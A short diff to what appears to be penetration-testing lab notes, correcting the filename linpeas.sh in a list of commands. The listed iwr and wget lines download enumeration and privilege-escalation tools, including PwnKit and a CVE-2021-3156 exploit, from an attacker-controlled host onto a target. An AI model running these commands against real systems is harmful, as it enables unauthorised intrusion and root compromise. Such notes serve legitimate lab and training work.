@@ -22,7 +22,7 @@ iwr -uri http://192.168.45.200:8000/busybox.exe -o busybox.exe
 # File downloads(for Linux)
 ``` bash
 wget http://192.168.45.200:8000/rustscan
-wget http://192.168.45.200:8000/inpeas.sh
+wget http://192.168.45.200:8000/linpeas.sh
 wget http://192.168.45.200:8000/pspy64
 wget http://192.168.45.200:8000/PwnKit
 wget http://192.168.45.200:8000/CVE-2021-3156.tar
